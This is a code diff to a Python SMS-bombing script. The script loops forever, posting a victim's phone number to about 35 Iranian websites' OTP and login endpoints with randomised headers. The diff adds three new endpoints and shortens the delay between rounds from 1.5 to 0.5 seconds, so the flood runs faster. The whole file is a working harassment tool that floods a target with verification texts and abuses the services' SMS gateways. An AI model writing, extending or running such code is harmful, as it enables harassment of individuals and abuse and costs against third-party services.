@@ -106,6 +106,16 @@ url_mar = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone
 url_gol = "https://www.golsetan.com/wp-json/panel/v1/auth/sendMobileAuth"
 json_gol = {"phoneNumber":"0" + number}
 
+url_snapp2 = "https://api.snapp.ir/api/v1/sms/link"
+json_snapp2 = {"phone" : "0" + number }
+
+url_nama = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
+json_nama = {"UserName" : "+98" + number}
+
+url_tlnt = "https://rest.talentcoach.ir/api/v1/service/trainees/"
+jsno_tlnt = {"cellphone": "+98" + number}
+
+
 heads = [
 
 {
@@ -136,99 +146,109 @@ while True:
     random_head = random.choice(heads)
 
     req = requests.post(url=url_divar,json=json_divar,headers=random_head)
-    print('SMS-SENT')
+    print('1 SMS-SENT')
 
     req1 = requests.post(url= url_snapp,json=json_snapp,headers=random_head)
-    print('SMS-SENT')
+    print('2 SMS-SENT')
 
     req2 = requests.post(url= url_sf,json=json_sf,headers=random_head)
-    print('SMS-SENT')
+    print('3 SMS-SENT')
 
     req3 = requests.post(url= url_sh,json=json_sh,headers=random_head)
-    print('SMS-SENT')
+    print('4 SMS-SENT')
 
     req4 = requests.post(url= url_alibaba,json=json_alibaba,headers=random_head)
-    print('SMS-SENT')
+    print('5 SMS-SENT')
 
     req5 = requests.post(url= url_cinma,json=json_cinma,headers=random_head)
-    print('SMS-SENT')
+    print('6 SMS-SENT')
 
     req6 = requests.post(url= url_digikala,json=json_digikala,headers=random_head)
-    print('SMS-SENT')
+    print('7 SMS-SENT')
 
     req7 = requests.post(url= url_jet,json=json_jet,headers=random_head)
-    print('SMS-SENT')
+    print('8 SMS-SENT')
 
     req8 = requests.post(url= url_virgool,json=json_virgool,headers=random_head)
-    print('SMS-SENT')
+    print('9 SMS-SENT')
 
     req9 = requests.post(url= url_aparat,json=json_aparat,headers=random_head)
-    print('SMS-SENT')
+    print('10 SMS-SENT')
 
     req10 = requests.post(url= url_telewebion,json=json_telewebion,headers=random_head)
-    print('SMS-SENT')
+    print('11 SMS-SENT')
 
     req11 = requests.post(url= url_sb,json=json_sb,headers=random_head)
-    print('SMS-SENT') 
+    print('12 SMS-SENT') 
 
     req12 = requests.post(url= url_tpsi,json=json_tpsi,headers=random_head)
-    print('SMS-SENT')
+    print('13 SMS-SENT')
     
     req13 = requests.post(url= url_tim,json=json_tim,headers=random_head)
-    print('SMS-SENT')
+    print('14 SMS-SENT')
 
     req14 = requests.post(url= url_of,json=json_of,headers=random_head)
-    print('SMS-SENT')
+    print('15 SMS-SENT')
 
     req15 = requests.post(url=url_tn,json=json_tn,headers=random_head) 
-    print('SMS-SENT')
+    print('16 SMS-SENT')
   
     req16 = requests.post(url=url_bazaar,json=json_bazaar,headers=random_head) 
-    print('SMS-SENT')
+    print('17 SMS-SENT')
 
     req17 = requests.post(url=url_dig,json=json_dig,headers=random_head) 
-    print('SMS-SENT')
+    print('18 SMS-SENT')
 
     req18 = requests.post(url=url_kk,json=json_kk,headers=random_head) 
-    print('SMS-SENT')
+    print('19 SMS-SENT')
 
     req19 = requests.post(url=url_mrg,headers=random_head) 
-    print('SMS-SENT')
+    print('20 SMS-SENT')
 
     req20 = requests.post(url=url_ba,json=json_ba,headers=random_head) 
-    print('SMS-SENT')
+    print('21 SMS-SENT')
 
     req21 = requests.post(url=url_mod,json=json_mod,headers=random_head) 
-    print('SMS-SENT')
+    print('22 SMS-SENT')
      
     req22 = requests.post(url=url_reg,json=json_reg,headers=random_head) 
-    print('SMS-SENT')
+    print('23 SMS-SENT')
     
     req23 = requests.post(url=url_doc,json=json_doc,headers=random_head) 
-    print('SMS-SENT')
+    print('24 SMS-SENT')
 
     req24 = requests.post(url=url_gap,json=json_gap,headers=random_head) 
-    print('SMS-SENT')
+    print('25 SMS-SENT')
 
     req25 = requests.post(url=url_it,json=json_it,headers=random_head) 
-    print('SMS-SENT')
+    print('26 SMS-SENT')
 
     req26 = requests.post(url=url_taa,json=json_taa,headers=random_head) 
-    print('SMS-SENT')
+    print('27 SMS-SENT')
 
     req27 = requests.post(url=url_ll,json=json_ll,headers=random_head) 
-    print('SMS-SENT')
+    print('28 SMS-SENT')
 
     req28 = requests.post(url=url_tap,json=json_tap,headers=random_head) 
-    print('SMS-SENT')
+    print('29 SMS-SENT')
 
     req29 = requests.post(url=url_fan,json=json_fan,headers=random_head) 
-    print('SMS-SENT')
+    print('30 SMS-SENT')
 
     req30 = requests.post(url=url_mar,headers=random_head) 
-    print('SMS-SENT')
+    print('31 SMS-SENT')
 
     req31 = requests.post(url=url_gol,json=json_gol,headers=random_head) 
-    print('SMS-SENT')
+    print('32 SMS-SENT')
+    
+    req1 = requests.post(url= url_snapp2,json=json_snapp2,headers=random_head)
+    print('33 SMS-SENT')
+    
+    req2 = requests.post(url= url_nama,json=json_nama,headers=random_head)
+    print('34 SMS-SENT')
+    
+    req3 = requests.post(url= url_tlnt,json=jsno_tlnt,headers=random_head)
+    print('35 SMS-SENT')
+    
 
-    time.sleep(1.5)
+    time.sleep(0.5)
